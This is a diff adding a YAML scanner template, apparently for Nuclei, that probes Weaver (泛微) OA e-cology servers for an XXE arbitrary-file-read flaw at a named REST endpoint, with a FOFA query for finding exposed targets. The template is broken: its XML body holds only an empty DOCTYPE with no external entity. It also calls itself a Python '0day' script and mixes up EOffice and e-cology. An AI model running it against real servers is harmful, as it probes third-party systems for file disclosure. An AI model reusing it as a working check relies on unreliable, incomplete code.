@@ -1,0 +1,37 @@
+id: 泛微OA e-cology XXE
+
+info:
+  name: oa泛微0day任意文件读取.py
+  severity: medium
+  description: 泛微OA e-cology XXE
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="泛微-EOffice"
+  tags: fanwei,ecology,exposure,config
+
+http:
+  - method: 
+      - POST
+    path:
+      - "{{BaseURL}}/rest/ofs/deleteUserRequestInfoByXml"
+    body:
+      - |
+        <?xml version="1.0"?>
+            <!DOCTYPE>
+
+      
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "syscode"
+          - "ResultInfo"
+        condition: and
+
+
+      - type: status
+        status:
+          - 200
